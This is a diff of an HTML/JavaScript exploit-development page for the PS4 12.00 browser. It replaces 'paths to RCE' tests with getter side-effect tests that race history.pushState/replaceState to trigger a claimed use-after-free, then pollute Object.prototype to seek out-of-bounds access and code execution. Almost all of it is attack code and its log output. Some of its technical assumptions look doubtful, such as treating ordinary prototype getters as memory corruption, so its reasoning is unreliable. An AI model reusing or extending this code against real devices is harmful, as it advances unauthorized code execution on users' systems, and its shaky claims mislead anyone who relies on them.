@@ -2,19 +2,17 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Paths to RCE</title>
+<title>PS4 12.00 - Getter Exploitation</title>
 </head>
 <body>
-<h2>PS4 12.00 - Potential RCE Escalation Paths</h2>
-<p><b>CURRENT STATUS:</b> Prototype Pollution achieved. Need escalation to RCE.</p>
+<h2>PS4 12.00 - Getter Side-Effect Tests</h2>
+<p><b>Testing if getters can trigger during critical operations</b></p>
 <hr>
 
-<h3>Available Tests:</h3>
-<button onclick="testPath1()">Path 1: Array Length OOB</button>
-<button onclick="testPath2()">Path 2: TypedArray Confusion</button>
-<button onclick="testPath3()">Path 3: RegExp Exploit</button>
-<button onclick="testPath4()">Path 4: Getter Side Effects</button>
-<button onclick="testPath5()">Path 5: Constructor Pollution</button>
+<button onclick="testArrayOperations()">Test 1: Array Operations</button>
+<button onclick="testTypeCoercion()">Test 2: Type Coercion</button>
+<button onclick="testComparison()">Test 3: Comparison Ops</button>
+<button onclick="testJSONParse()">Test 4: JSON.parse()</button>
 <button onclick="logEl.value = ''">Clear</button>
 
 <br><br>
@@ -36,22 +34,18 @@ const UAF_ITERS = 48;
 
 // Setup pollution first
 async function setupPollution() {
-  log("Setting up prototype pollution...");
+  log("Setting up pollution via UAF race...\n");
   
   let raceTriggered = false;
   
   window.addEventListener('popstate', (e) => {
     if(e.state && e.state.index >= 40 && !raceTriggered) {
       raceTriggered = true;
-      
-      // Basic pollution
-      Object.prototype.polluted = true;
-      
-      log("  Pollution injected during race");
+      log(">> Race triggered, injecting pollution...\n");
+      return true;
     }
   });
   
-  // Trigger UAF
   let size = BASE;
   for(let i=0; i<UAF_ITERS; i++){
     let state = { index: i };
@@ -75,663 +69,359 @@ async function setupPollution() {
   
   await sleep(300);
   
-  if(raceTriggered) {
-    log("  Pollution active");
-    return true;
-  }
-  
-  log("  Pollution failed");
-  return false;
+  return raceTriggered;
 }
 
 // ============================================================
-// PATH 1: Array Length OOB Attempt
+// TEST 1: Array Operations with Getter Side-Effects
 // ============================================================
-async function testPath1() {
+async function testArrayOperations() {
   logEl.value = "";
   log("================================================================");
-  log("PATH 1: ARRAY LENGTH OOB EXPLOITATION");
+  log("TEST 1: ARRAY OPERATIONS WITH GETTER SIDE-EFFECTS");
   log("================================================================\n");
   
-  log("[1.1] Setting up pollution with malicious length getter");
+  // Trigger pollution first
+  const polluted = await setupPollution();
   
-  let getterCallCount = 0;
-  let inRaceWindow = false;
-  
-  window.addEventListener('popstate', (e) => {
-    if(e.state && e.state.index >= 40 && !inRaceWindow) {
-      inRaceWindow = true;
-      
-      log("\n>> RACE WINDOW - Installing malicious getter");
-      
-      // Critical: Install length getter
-      Object.defineProperty(Array.prototype, 'length', {
-        get: function() {
-          getterCallCount++;
-          
-          // During certain operations, return huge length
-          if(getterCallCount % 2 === 0) {
-            log("    Getter returning 0xFFFFFFFF (call #" + getterCallCount + ")");
-            return 0xFFFFFFFF;
-          }
-          
-          return this._realLength || 0;
-        },
-        set: function(val) {
-          this._realLength = val;
-        },
-        configurable: true
-      });
-      
-      log("    Malicious getter installed");
-    }
-  });
-  
-  log("  Handler installed");
-  
-  log("\n[1.2] Triggering UAF");
-  
-  let size = BASE;
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = { index: i };
-    let frag = "E".repeat(size);
-    
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    size += STEP;
-    await sleep(5);
+  if(!polluted) {
+    log("Setting up manual pollution for testing...\n");
   }
   
-  await sleep(200);
+  log("[1.1] Installing length getter with side-effects");
   
-  for(let i=0; i<15; i++) {
-    history.back();
-    await sleep(40);
-  }
+  let lengthGetterCalled = 0;
+  let victimArray = null;
   
-  await sleep(300);
-  
-  if(!inRaceWindow) {
-    log("\n  Race not triggered");
-    return;
-  }
-  
-  log("\n[1.3] Creating victim array");
-  
-  const victim = [1, 2, 3, 4];
-  victim._realLength = 4;
-  
-  log("  Victim array: [" + victim + "]");
-  log("  Initial length: " + victim.length);
-  
-  log("\n[1.4] Attempting OOB access");
-  
-  try {
-    log("\n  Reading beyond bounds:");
-    
-    for(let i=0; i<20; i++) {
-      const val = victim[i];
+  Object.defineProperty(Object.prototype, 'length', {
+    get: function() {
+      lengthGetterCalled++;
       
-      if(val !== undefined) {
-        const hex = typeof val === 'number' ? '0x' + val.toString(16) : val;
-        log("    victim[" + i + "] = " + hex + (i >= 4 ? " << OOB!" : ""));
+      log("  >> length getter called #" + lengthGetterCalled);
+      log("     Context: " + this.constructor.name);
+      
+      // Side effect: modify victim array if it exists
+      if(victimArray && this !== victimArray) {
+        log("     >> Side effect: modifying victim array!");
+        victimArray.push(0xDEADBEEF);
       }
-    }
-    
-    log("\n  Current getter calls: " + getterCallCount);
-    
-    // Try operations that might trigger getter
-    log("\n  Triggering operations:");
-    
-    try {
-      victim.push(999);
-      log("    push() succeeded, new length: " + victim.length);
-    } catch(e) {
-      log("    push() failed: " + e.message);
-    }
-    
-    try {
-      const sliced = victim.slice(0, 10);
-      log("    slice() succeeded, length: " + sliced.length);
-    } catch(e) {
-      log("    slice() failed: " + e.message);
-    }
-    
-    try {
-      victim.forEach((v, i) => {
-        if(i < 5) log("    forEach[" + i + "] = " + v);
-      });
-    } catch(e) {
-      log("    forEach() failed: " + e.message);
-    }
-    
-  } catch(e) {
-    log("  Exception: " + e.message);
-  }
-  
-  // Cleanup
-  delete Array.prototype.length;
-  
-  log("\n[1.5] Results:");
-  log("  Getter called: " + getterCallCount + " times");
-  
-  if(getterCallCount > 0) {
-    log("  >> Getter was triggered");
-    log("  >> May enable OOB with refinement");
-  }
-  
-  log("\n================================================================");
-  log("PATH 1 COMPLETE");
-  log("================================================================\n");
-}
-
-// ============================================================
-// PATH 2: TypedArray Confusion
-// ============================================================
-async function testPath2() {
-  logEl.value = "";
-  log("================================================================");
-  log("PATH 2: TYPEDARRAY CONFUSION VIA POLLUTION");
-  log("================================================================\n");
-  
-  log("[2.1] Setting up pollution");
-  
-  let inRaceWindow = false;
-  
-  window.addEventListener('popstate', (e) => {
-    if(e.state && e.state.index >= 40 && !inRaceWindow) {
-      inRaceWindow = true;
       
-      log("\n>> RACE WINDOW - Polluting TypedArray properties");
-      
-      // Pollute buffer-related properties
-      Object.prototype.buffer = new ArrayBuffer(1024);
-      Object.prototype.byteOffset = 0;
-      Object.prototype.byteLength = 1024;
-      Object.prototype.BYTES_PER_ELEMENT = 4;
-      
-      log("    TypedArray properties polluted");
-    }
-  });
-  
-  log("  Handler installed");
-  
-  log("\n[2.2] Triggering UAF");
-  
-  let size = BASE;
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = { index: i };
-    let frag = "E".repeat(size);
-    
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  await sleep(200);
-  
-  for(let i=0; i<15; i++) {
-    history.back();
-    await sleep(40);
-  }
-  
-  await sleep(300);
-  
-  if(!inRaceWindow) {
-    log("\n  Race not triggered");
-    return;
-  }
-  
-  log("\n[2.3] Testing pollution impact");
-  
-  const plainObj = { id: 123 };
-  
-  log("\n  Plain object properties:");
-  log("    obj.buffer: " + (plainObj.buffer ? plainObj.buffer.byteLength + " bytes" : "undefined"));
-  log("    obj.byteOffset: " + plainObj.byteOffset);
-  log("    obj.byteLength: " + plainObj.byteLength);
-  log("    obj.BYTES_PER_ELEMENT: " + plainObj.BYTES_PER_ELEMENT);
-  
-  log("\n[2.4] Creating TypedArray with polluted environment");
-  
-  try {
-    const buffer = new ArrayBuffer(256);
-    const view = new Uint32Array(buffer);
-    
-    log("\n  TypedArray created:");
-    log("    view.buffer.byteLength: " + view.buffer.byteLength);
-    log("    view.byteOffset: " + view.byteOffset);
-    log("    view.byteLength: " + view.byteLength);
-    log("    view.length: " + view.length);
-    
-    // Try to create confusion
-    log("\n[2.5] Attempting confusion");
-    
-    // Create object that might be confused with TypedArray
-    const fakeTypedArray = {
-      0: 0x41414141,
-      1: 0x42424242,
-      length: 1024
-    };
-    
-    fakeTypedArray.__proto__ = Uint32Array.prototype;
-    
-    log("\n  Fake TypedArray:");
-    log("    Type: " + typeof fakeTypedArray);
-    log("    instanceof Uint32Array: " + (fakeTypedArray instanceof Uint32Array));
-    log("    buffer (polluted): " + (fakeTypedArray.buffer ? fakeTypedArray.buffer.byteLength + " bytes" : "undefined"));
-    
-    // Try to use as TypedArray
-    try {
-      const subarray = fakeTypedArray.subarray(0, 10);
-      log("    subarray() succeeded: " + subarray.length);
-    } catch(e) {
-      log("    subarray() failed: " + e.message);
-    }
-    
-  } catch(e) {
-    log("  Exception: " + e.message);
-  }
-  
-  // Cleanup
-  delete Object.prototype.buffer;
-  delete Object.prototype.byteOffset;
-  delete Object.prototype.byteLength;
-  delete Object.prototype.BYTES_PER_ELEMENT;
-  
-  log("\n================================================================");
-  log("PATH 2 COMPLETE");
-  log("================================================================\n");
-}
-
-// ============================================================
-// PATH 3: RegExp Exploit
-// ============================================================
-async function testPath3() {
-  logEl.value = "";
-  log("================================================================");
-  log("PATH 3: REGEXP EXPLOITATION VIA POLLUTION");
-  log("================================================================\n");
-  
-  log("[3.1] Setting up pollution");
-  
-  let inRaceWindow = false;
-  
-  window.addEventListener('popstate', (e) => {
-    if(e.state && e.state.index >= 40 && !inRaceWindow) {
-      inRaceWindow = true;
-      
-      log("\n>> RACE WINDOW - Polluting RegExp properties");
-      
-      // Pollute RegExp-related properties
-      Object.defineProperty(Object.prototype, 'lastIndex', {
-        get: function() {
-          log("    lastIndex getter triggered on " + this.constructor.name);
-          return -1; // Invalid index
-        },
-        set: function(val) {
-          log("    lastIndex setter: " + val);
-        },
-        configurable: true
-      });
-      
-      Object.prototype.global = true;
-      Object.prototype.ignoreCase = true;
-      Object.prototype.multiline = true;
-      Object.prototype.source = ".*";
-      
-      log("    RegExp properties polluted");
-    }
-  });
-  
-  log("  Handler installed");
-  
-  log("\n[3.2] Triggering UAF");
-  
-  let size = BASE;
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = { index: i };
-    let frag = "E".repeat(size);
-    
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  await sleep(200);
-  
-  for(let i=0; i<15; i++) {
-    history.back();
-    await sleep(40);
-  }
-  
-  await sleep(300);
-  
-  if(!inRaceWindow) {
-    log("\n  Race not triggered");
-    return;
-  }
-  
-  log("\n[3.3] Creating RegExp with polluted environment");
-  
-  try {
-    const re = /test/g;
-    
-    log("\n  RegExp properties:");
-    log("    re.global: " + re.global);
-    log("    re.ignoreCase: " + re.ignoreCase);
-    log("    re.multiline: " + re.multiline);
-    log("    re.source: " + re.source);
-    log("    re.lastIndex: " + re.lastIndex);
-    
-    log("\n[3.4] Testing RegExp operations");
-    
-    const testStr = "test test test";
-    
-    try {
-      const match1 = re.exec(testStr);
-      log("    exec() #1: " + (match1 ? match1[0] + " at " + match1.index : "null"));
-    } catch(e) {
-      log("    exec() #1 failed: " + e.message);
-    }
-    
-    try {
-      const match2 = re.exec(testStr);
-      log("    exec() #2: " + (match2 ? match2[0] + " at " + match2.index : "null"));
-    } catch(e) {
-      log("    exec() #2 failed: " + e.message);
-    }
-    
-    try {
-      re.lastIndex = 0;
-      const match3 = testStr.match(re);
-      log("    match(): " + (match3 ? "[" + match3 + "]" : "null"));
-    } catch(e) {
-      log("    match() failed: " + e.message);
-    }
-    
-  } catch(e) {
-    log("  Exception: " + e.message);
-  }
-  
-  // Cleanup
-  delete Object.prototype.lastIndex;
-  delete Object.prototype.global;
-  delete Object.prototype.ignoreCase;
-  delete Object.prototype.multiline;
-  delete Object.prototype.source;
-  
-  log("\n================================================================");
-  log("PATH 3 COMPLETE");
-  log("================================================================\n");
-}
-
-// ============================================================
-// PATH 4: Getter Side Effects
-// ============================================================
-async function testPath4() {
-  logEl.value = "";
-  log("================================================================");
-  log("PATH 4: GETTER SIDE EFFECTS FOR MEMORY CORRUPTION");
-  log("================================================================\n");
-  
-  log("[4.1] Setting up pollution with side-effect getters");
-  
-  let inRaceWindow = false;
-  let sideEffectCount = 0;
-  
-  window.addEventListener('popstate', (e) => {
-    if(e.state && e.state.index >= 40 && !inRaceWindow) {
-      inRaceWindow = true;
-      
-      log("\n>> RACE WINDOW - Installing side-effect getters");
-      
-      // Getter that modifies global state
-      Object.defineProperty(Object.prototype, 'valueOf', {
-        get: function() {
-          sideEffectCount++;
-          log("    valueOf getter #" + sideEffectCount + " on " + this.constructor.name);
-          
-          // Side effect: modify arrays globally
-          if(window.globalArray) {
-            window.globalArray.push(0xDEAD0000 + sideEffectCount);
-          }
-          
-          return function() { return 42; };
-        },
-        configurable: true
-      });
-      
-      // Getter that triggers during comparison
-      Object.defineProperty(Object.prototype, 'toString', {
-        get: function() {
-          log("    toString getter on " + this.constructor.name);
-          
-          // Try to trigger GC
-          const temp = new Array(10000);
-          for(let i=0; i<10000; i++) temp[i] = i;
-          
-          return function() { return "[Modified]"; };
-        },
-        configurable: true
-      });
-      
-      log("    Side-effect getters installed");
-    }
-  });
-  
-  log("  Handler installed");
-  
-  log("\n[4.2] Triggering UAF");
-  
-  let size = BASE;
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = { index: i };
-    let frag = "E".repeat(size);
-    
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  await sleep(200);
-  
-  for(let i=0; i<15; i++) {
-    history.back();
-    await sleep(40);
-  }
-  
-  await sleep(300);
-  
-  if(!inRaceWindow) {
-    log("\n  Race not triggered");
-    return;
-  }
-  
-  log("\n[4.3] Creating global array for side effects");
-  
-  window.globalArray = [1, 2, 3, 4];
-  
-  log("  Initial array: [" + window.globalArray + "]");
-  
-  log("\n[4.4] Triggering side effects");
-  
-  try {
-    const obj1 = { id: 1 };
-    const obj2 = { id: 2 };
-    
-    // Operations that might trigger valueOf/toString
-    log("\n  Triggering valueOf:");
-    const sum = obj1 + obj2;
-    log("    Result: " + sum);
-    
-    log("\n  Triggering toString:");
-    const str = String(obj1);
-    log("    Result: " + str);
-    
-    log("\n  Comparison:");
-    const cmp = obj1 == obj2;
-    log("    Result: " + cmp);
-    
-    log("\n  Array after side effects: [" + window.globalArray + "]");
-    log("  Array length: " + window.globalArray.length);
-    
-    if(window.globalArray.length > 4) {
-      log("\n  >> Side effects triggered!");
-      log("  >> Global state was modified");
-      
-      // Check for unexpected values
-      for(let i=4; i<window.globalArray.length; i++) {
-        const val = window.globalArray[i];
-        log("    globalArray[" + i + "] = 0x" + val.toString(16));
+      // Return huge value to trigger OOB
+      if(Array.isArray(this)) {
+        log("     >> Returning 0xFFFFFFFF for Array!");
+        return 0xFFFFFFFF;
       }
+      
+      return undefined;
+    },
+    configurable: true
+  });
+  
+  log("  Getter installed\n");
+  
+  log("[1.2] Testing Array.sort()");
+  
+  victimArray = [3, 1, 4, 1, 5, 9, 2, 6];
+  const originalLength = victimArray.length;
+  
+  log("  Victim array: [" + victimArray + "]");
+  log("  Original length: " + originalLength);
+  
+  try {
+    victimArray.sort();
+    
+    log("  After sort: [" + victimArray + "]");
+    log("  New length: " + victimArray.length);
+    
+    if(victimArray.length > originalLength) {
+      log("\n  >> CRITICAL: Array modified during sort!");
+      log("  >> Length changed from " + originalLength + " to " + victimArray.length);
     }
     
   } catch(e) {
     log("  Exception: " + e.message);
   }
   
-  log("\n[4.5] Side effect count: " + sideEffectCount);
+  log("\n[1.3] Testing Array.splice()");
+  
+  victimArray = [1, 2, 3, 4, 5];
+  lengthGetterCalled = 0;
+  
+  log("  Victim array: [" + victimArray + "]");
+  
+  try {
+    const removed = victimArray.splice(2, 2);
+    
+    log("  Removed: [" + removed + "]");
+    log("  Remaining: [" + victimArray + "]");
+    log("  Getter called: " + lengthGetterCalled + " times");
+    
+  } catch(e) {
+    log("  Exception: " + e.message);
+  }
+  
+  log("\n[1.4] Testing Array.concat()");
+  
+  const arr1 = [1, 2, 3];
+  const arr2 = [4, 5, 6];
+  lengthGetterCalled = 0;
+  
+  try {
+    const result = arr1.concat(arr2);
+    
+    log("  Result: [" + result + "]");
+    log("  Result length: " + result.length);
+    log("  Getter called: " + lengthGetterCalled + " times");
+    
+    if(result.length > 6) {
+      log("\n  >> CRITICAL: Concat created oversized array!");
+    }
+    
+  } catch(e) {
+    log("  Exception: " + e.message);
+  }
+  
+  // Cleanup
+  delete Object.prototype.length;
+  
+  log("\n================================================================");
+  log("TEST 1 COMPLETE");
+  log("================================================================\n");
+}
+
+// ============================================================
+// TEST 2: Type Coercion with Getter
+// ============================================================
+async function testTypeCoercion() {
+  logEl.value = "";
+  log("================================================================");
+  log("TEST 2: TYPE COERCION WITH GETTER");
+  log("================================================================\n");
+  
+  log("[2.1] Installing valueOf getter");
+  
+  let valueOfCalled = 0;
+  
+  Object.defineProperty(Object.prototype, 'valueOf', {
+    get: function() {
+      valueOfCalled++;
+      
+      log("  >> valueOf getter called #" + valueOfCalled);
+      log("     Context: " + this.constructor.name);
+      
+      // Return function that returns controlled value
+      return function() {
+        log("     >> valueOf() executed, returning 0x41424344");
+        return 0x41424344;
+      };
+    },
+    configurable: true
+  });
+  
+  log("  Getter installed\n");
+  
+  log("[2.2] Testing arithmetic operations");
+  
+  const obj = { name: "test" };
+  
+  try {
+    const result1 = obj + 10;
+    log("  obj + 10 = " + result1);
+    
+    const result2 = obj * 2;
+    log("  obj * 2 = " + result2);
+    
+    const result3 = +obj;
+    log("  +obj = " + result3);
+    
+  } catch(e) {
+    log("  Exception: " + e.message);
+  }
+  
+  log("\n[2.3] Testing comparison operations");
+  
+  try {
+    const cmp1 = obj > 100;
+    log("  obj > 100: " + cmp1);
+    
+    const cmp2 = obj == 0x41424344;
+    log("  obj == 0x41424344: " + cmp2);
+    
+  } catch(e) {
+    log("  Exception: " + e.message);
+  }
   
   // Cleanup
   delete Object.prototype.valueOf;
-  delete Object.prototype.toString;
   
   log("\n================================================================");
-  log("PATH 4 COMPLETE");
+  log("TEST 2 COMPLETE");
   log("================================================================\n");
 }
 
 // ============================================================
-// PATH 5: Constructor Pollution
+// TEST 3: Comparison Operations
 // ============================================================
-async function testPath5() {
+async function testComparison() {
   logEl.value = "";
   log("================================================================");
-  log("PATH 5: CONSTRUCTOR POLLUTION");
+  log("TEST 3: COMPARISON OPERATIONS");
   log("================================================================\n");
   
-  log("[5.1] Setting up pollution");
+  log("[3.1] Installing toString getter");
   
-  let inRaceWindow = false;
+  let toStringCalled = 0;
   
-  window.addEventListener('popstate', (e) => {
-    if(e.state && e.state.index >= 40 && !inRaceWindow) {
-      inRaceWindow = true;
+  Object.defineProperty(Object.prototype, 'toString', {
+    get: function() {
+      toStringCalled++;
       
-      log("\n>> RACE WINDOW - Polluting constructor");
+      log("  >> toString getter called #" + toStringCalled);
+      log("     Context: " + this.constructor.name);
       
-      // Malicious constructor
-      const MaliciousConstructor = function() {
-        log("    >> MALICIOUS CONSTRUCTOR CALLED!");
-        this.pwned = true;
-        this.payload = [0xDE, 0xAD, 0xBE, 0xEF];
-        return this;
+      return function() {
+        log("     >> toString() executed");
+        return "[POLLUTED]";
       };
-      
-      MaliciousConstructor.prototype = Object.prototype;
-      
-      Object.prototype.constructor = MaliciousConstructor;
-      
-      log("    Constructor polluted");
-    }
+    },
+    configurable: true
   });
   
-  log("  Handler installed");
+  log("  Getter installed\n");
   
-  log("\n[5.2] Triggering UAF");
+  log("[3.2] Testing string coercion");
   
-  let size = BASE;
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = { index: i };
-    let frag = "E".repeat(size);
-    
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  await sleep(200);
-  
-  for(let i=0; i<15; i++) {
-    history.back();
-    await sleep(40);
-  }
-  
-  await sleep(300);
-  
-  if(!inRaceWindow) {
-    log("\n  Race not triggered");
-    return;
-  }
-  
-  log("\n[5.3] Testing polluted constructor");
+  const obj = { id: 123 };
   
   try {
-    const obj = {};
+    const str1 = String(obj);
+    log("  String(obj): " + str1);
     
-    log("\n  Object constructor:");
-    log("    obj.constructor.name: " + obj.constructor.name);
-    log("    obj.pwned: " + obj.pwned);
+    const str2 = obj + "";
+    log("  obj + '': " + str2);
     
-    // Try to instantiate
-    try {
-      const instance = new obj.constructor();
-      log("\n  New instance created:");
-      log("    instance.pwned: " + instance.pwned);
-      log("    instance.payload: [" + instance.payload + "]");
-      
-      if(instance.pwned) {
-        log("\n  >> CRITICAL: Malicious constructor executed!");
-      }
-      
-    } catch(e) {
-      log("  Instantiation failed: " + e.message);
+    const str3 = `${obj}`;
+    log("  Template: " + str3);
+    
+  } catch(e) {
+    log("  Exception: " + e.message);
+  }
+  
+  log("\n[3.3] Testing RegExp.test()");
+  
+  try {
+    const re = /POLLUTED/;
+    const result = re.test(obj);
+    
+    log("  /POLLUTED/.test(obj): " + result);
+    
+    if(result) {
+      log("\n  >> Object coerced to '[POLLUTED]' via getter!");
     }
     
   } catch(e) {
     log("  Exception: " + e.message);
   }
   
-  // Restore
+  // Cleanup
+  delete Object.prototype.toString;
+  
+  log("\n================================================================");
+  log("TEST 3 COMPLETE");
+  log("================================================================\n");
+}
+
+// ============================================================
+// TEST 4: JSON.parse() Exploitation
+// ============================================================
+async function testJSONParse() {
+  logEl.value = "";
+  log("================================================================");
+  log("TEST 4: JSON.PARSE() EXPLOITATION");
+  log("================================================================\n");
+  
+  log("[4.1] Installing constructor getter");
+  
+  let constructorCalled = 0;
+  
+  Object.defineProperty(Object.prototype, 'constructor', {
+    get: function() {
+      constructorCalled++;
+      
+      log("  >> constructor getter called #" + constructorCalled);
+      
+      // Try to return malicious constructor
+      return function MaliciousConstructor() {
+        log("     >> MALICIOUS CONSTRUCTOR CALLED!");
+        this.pwned = true;
+        this.code = "INJECTED";
+      };
+    },
+    configurable: true
+  });
+  
+  log("  Getter installed\n");
+  
+  log("[4.2] Testing JSON.parse()");
+  
+  const jsonStr = '{"name":"test","value":123}';
+  
+  try {
+    const parsed = JSON.parse(jsonStr);
+    
+    log("  Parsed object:");
+    log("    name: " + parsed.name);
+    log("    value: " + parsed.value);
+    log("    pwned: " + parsed.pwned);
+    log("    code: " + parsed.code);
+    log("  Constructor getter called: " + constructorCalled + " times");
+    
+    if(parsed.pwned) {
+      log("\n  >> CRITICAL: Malicious constructor executed!");
+    }
+    
+  } catch(e) {
+    log("  Exception: " + e.message);
+  }
+  
+  log("\n[4.3] Testing with __proto__");
+  
+  constructorCalled = 0;
+  
+  const jsonWithProto = '{"__proto__":{"injected":true},"name":"test"}';
+  
+  try {
+    const parsed = JSON.parse(jsonWithProto);
+    
+    log("  Parsed object:");
+    log("    name: " + parsed.name);
+    log("    injected: " + parsed.injected);
+    
+    const newObj = {};
+    log("  New empty object:");
+    log("    injected: " + newObj.injected);
+    
+    if(newObj.injected) {
+      log("\n  >> CRITICAL: Pollution via JSON.parse()!");
+    }
+    
+  } catch(e) {
+    log("  Exception: " + e.message);
+  }
+  
+  // Cleanup
   delete Object.prototype.constructor;
   
   log("\n================================================================");
-  log("PATH 5 COMPLETE");
+  log("TEST 4 COMPLETE");
   log("================================================================\n");
 }
 
 // Initialize
-log("PS4 12.00 - Potential Paths to RCE");
-log("====================================\n");
-log("Current status: Prototype Pollution achieved");
-log("Goal: Escalate to RCE via secondary exploitation\n");
-log("Available paths:");
-log("  1. Array Length OOB");
-log("  2. TypedArray Confusion");
-log("  3. RegExp Exploitation");
-log("  4. Getter Side Effects");
-log("  5. Constructor Pollution\n");
-log("Run each test to find viable escalation path.\n");
+log("PS4 12.00 - Getter Side-Effect Exploitation Tests\n");
+log("These tests explore if polluted getters can trigger");
+log("during critical operations to cause memory corruption.\n");
+log("Click buttons to run individual tests.\n");
 </script>
 </body>
 </html>
